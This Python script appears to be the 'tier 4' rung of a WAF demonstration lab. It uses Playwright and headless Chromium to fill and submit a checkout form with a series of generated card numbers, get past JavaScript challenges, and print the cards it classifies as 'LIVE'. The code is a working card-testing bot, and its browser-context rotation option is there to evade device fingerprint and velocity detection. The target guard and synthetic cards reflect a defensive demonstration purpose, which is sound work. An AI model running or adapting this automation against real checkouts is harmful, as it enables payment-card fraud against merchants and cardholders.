#!/usr/bin/env python3
"""Tier 4 -- headless browser carding.

A real Chromium executes the page's JavaScript, so a JS challenge that stops
tier 2/3 dead is solved automatically here. The form is filled through the DOM
and submitted like a human would.

What remains visible to the WAF is the thing a browser cannot hide: one device
pushing card after card. Browser Integrity Verification flags the automation
framework itself, and device-level velocity catches the fingerprint testing
dozens of cards in a row. Both are Advanced Bot Protection features -- confirm
the tenant is licensed before demonstrating this rung.

Setup:
    pip install playwright && playwright install chromium
"""

import time

from playwright.sync_api import TimeoutError as PlaywrightTimeout
from playwright.sync_api import sync_playwright

import labcards


def fill_and_submit(page, checkout_url, record, timeout_ms):
    page.goto(checkout_url, timeout=timeout_ms, wait_until="domcontentloaded")
    page.fill("#cardholder", "A Shopper")
    page.fill("#card_number", record["pan"])
    page.fill("#exp_month", record["exp_month"])
    page.fill("#exp_year", record["exp_year"])
    page.fill("#cvv", record["cvv"])
    page.fill("#postcode", "SW1A 1AA")
    page.click("button[type=submit]")
    page.wait_for_load_state("domcontentloaded", timeout=timeout_ms)
    return labcards.classify(200, page.content())


def main():
    parser = labcards.base_parser(__doc__.splitlines()[0])
    parser.add_argument("--headed", action="store_true",
                        help="show the browser window (useful on a demo screen)")
    parser.add_argument("--cards-per-context", type=int, default=0,
                        help="rotate the browser context every N cards (0 = never, "
                             "which is the single-fingerprint case the WAF should catch)")
    parser.add_argument("--delay", type=float, default=1.0,
                        help="seconds between cards")
    args = parser.parse_args()
    labcards.guard_target(args.target, args.force)

    dump = labcards.build_dump(args.count, args.secret, args.seed)
    checkout_url = args.target.rstrip("/") + "/checkout"
    tally = labcards.Tally()
    timeout_ms = int(args.timeout * 1000)
    started = time.time()

    print(f"tier 4: driving Chromium through {args.count} cards at {checkout_url}\n")

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=not args.headed)
        context = browser.new_context()
        page = context.new_page()

        for index, record in enumerate(dump):
            if args.cards_per_context and index and index % args.cards_per_context == 0:
                page.close()
                context.close()
                context = browser.new_context()
                page = context.new_page()

            try:
                outcome = fill_and_submit(page, checkout_url, record, timeout_ms)
            except PlaywrightTimeout:
                outcome = "error"
            except Exception as exc:
                outcome = "error"
                print(f"  {record['pan']}  error: {type(exc).__name__}")

            tally.add(outcome, record)
            if outcome == "approved":
                print(f"  {record['pan']}  exp {record['exp_month']}/{record['exp_year']}  "
                      f"cvv {record['cvv']}  LIVE")
            elif outcome in ("blocked", "challenge"):
                print(f"  {record['pan']}  {outcome}")

            time.sleep(args.delay)

        page.close()
        context.close()
        browser.close()

    print(tally.summary(time.time() - started))
    labcards.save_live(args.out, tally.live)


if __name__ == "__main__":
    main()
